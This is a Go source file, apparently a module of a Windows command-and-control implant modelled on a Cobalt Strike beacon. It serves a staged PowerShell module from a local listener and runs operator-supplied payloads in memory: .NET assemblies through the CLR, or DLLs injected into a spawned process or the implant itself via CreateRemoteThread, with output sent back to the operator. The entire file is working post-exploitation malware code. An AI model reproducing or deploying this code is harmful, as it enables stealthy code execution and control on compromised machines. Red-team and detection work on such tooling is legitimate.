//go:build windows

package command

import (
	"bytes"
	"errors"
	"github.com/Ne0nd0g/go-clr"
	"golang.org/x/sys/windows"
	"main/config"
	"main/packet"
	"main/util"
	"net"
	"strconv"
	"strings"
	"unsafe"
)

var powershellModule []byte

func PowershellImport(b []byte) {
	powershellModule = b
}

func WebDelivery(b []byte) {
	buf := bytes.NewBuffer(b)
	serverPort := packet.ReadShort(buf)
	go func() {
		l, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(serverPort)))
		if err != nil {
			packet.ErrorMessage(err.Error())
			return
		}
		defer l.Close()
		conn, err := l.Accept()
		if err != nil {
			util.Println("Error accepting: ", err)
			packet.ErrorMessage(err.Error())
			return
		}
		defer conn.Close()
		httpHeader := util.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
		receive := make([]byte, 1024)
		_, _ = conn.Read(receive)
		_, _ = conn.Write([]byte(httpHeader))
		_, _ = conn.Write(powershellModule)
		_ = conn.Close()
	}()
}

// it seems that some user custom plugins will use ExecAsm to inject dll,
// maybe because normal inject dll doesn't accept args?
// use go to execute C#, and dll inject to execute dll with args
func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
	// execAsm don't need to handle job
	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
	_, _, _, description, _, _, _ := parseExecAsm(b)
	if string(description) != ".NET assembly" {
		return execAsmInject(b, isDllX64, ignoreToken)
	}
	//return execAsmInject(b, isDllX64, ignoreToken)
	return execAsmGo(b)
}

// TODO deal with raw reflective dll
func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
	callBackType, sleepTime, offset, _, args, dll, err := parseExecAsm(b)
	if config.InjectSelf {
		hThread, err := injectSelf(dll, offset, args)
		if err != nil {
			return err
		}
		_ = windows.CloseHandle(windows.Handle(hThread))
	} else {
		procInfo := &windows.ProcessInformation{}
		startupInfo := &windows.StartupInfo{
			Flags:      windows.STARTF_USESTDHANDLES,
			ShowWindow: 1,
		}
		var rPipe, wPipe windows.Handle
		sa := windows.SecurityAttributes{
			Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
			SecurityDescriptor: nil,
			InheritHandle:      1, //true
		}

		err = windows.CreatePipe(&rPipe, &wPipe, &sa, 0)
		if err != nil {
			return errors.New(util.Sprintf("CreatePipe error: %s", err))
		}
		defer windows.CloseHandle(wPipe)
		defer windows.CloseHandle(rPipe)
		startupInfo.Flags = windows.STARTF_USESTDHANDLES
		startupInfo.StdErr = wPipe
		startupInfo.StdOutput = wPipe

		err = spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
		defer windows.CloseHandle(procInfo.Process)
		defer windows.CloseHandle(procInfo.Thread)
		if err != nil {
			return err
		}

		err = createRemoteThread(procInfo.Process, dll, offset, args)
		if err != nil {
			return err
		}
		return loopRead(procInfo.Process, rPipe, int(sleepTime), int(callBackType), nil)
	}
	return nil
}

func execAsmGo(b []byte) error {
	// callBackType, sleepTime, offset, description, args(csharp), dll, err
	callBackType, _, _, _, csharp, _, err := parseExecAsm(b)
	// use golang to execute assembly directly
	csharpBuf := bytes.NewBuffer(csharp)
	csharpBin, _ := parseAnArg(csharpBuf)
	csharpArgs := csharpBuf.Bytes()
	args := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(&csharpArgs[0])))
	// use space as separator of command
	argsArr := strings.Split(args, " ")

	err = clr.RedirectStdoutStderr()
	if err != nil {
		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
	}
	runtimeHost, err := clr.LoadCLR("v4")
	if err != nil {
		return errors.New(util.Sprintf("LoadCLR error: %s", err))
	}
	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
	if err != nil {
		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
	if stdout != "" {
		packet.PushResult(int(callBackType), []byte(stdout))
	}
	if stderr != "" {
		return errors.New(stderr)
	}
	return nil
}
